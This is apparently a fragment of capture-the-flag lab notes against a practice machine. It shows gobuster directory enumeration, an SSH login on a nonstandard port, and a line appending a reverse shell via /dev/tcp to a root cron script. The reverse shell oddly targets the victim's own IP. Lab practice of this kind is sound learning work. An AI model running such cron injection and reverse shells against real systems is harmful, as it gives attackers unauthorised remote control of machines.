...
gobuster dir -u http://10.10.146.67 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

gobuster dir -u http://10.10.146.67:65524 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

gobuster dir -u http://10.10.146.67/hidden -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak
...
ssh boring@10.10.146.67 -p 6498
...
echo "sh -i >& /dev/tcp/10.10.146.67/5555 0>&1" >> /var/www/.mysecretcronjob.sh
